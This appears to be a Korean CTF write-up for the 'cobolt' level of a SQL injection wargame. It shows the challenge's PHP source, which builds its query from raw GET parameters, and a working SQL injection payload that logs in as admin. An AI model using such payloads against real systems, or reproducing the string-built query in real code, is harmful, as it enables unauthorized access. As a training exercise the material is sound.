# cobolt

소스코드는 다음과 같다.

```php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

`id`가 `admin`이면 클리어가 된다. 이때 `id`와 `pw`를 우리가 넣어 줄 수 있는데 `pw`에 `md5`가 있으니, `id`에 값을 넣어 `escape`하면 될 것 같다.

> ?id=admin' or ''='&pw=1 이렇게 넣어준다면 `query`는 다음과 같다.

```sql
select id from prob_cobolt where id='admin' or ''='' and pw=md5('1')
```

이로써 `cobolt`를 잡게되었다.

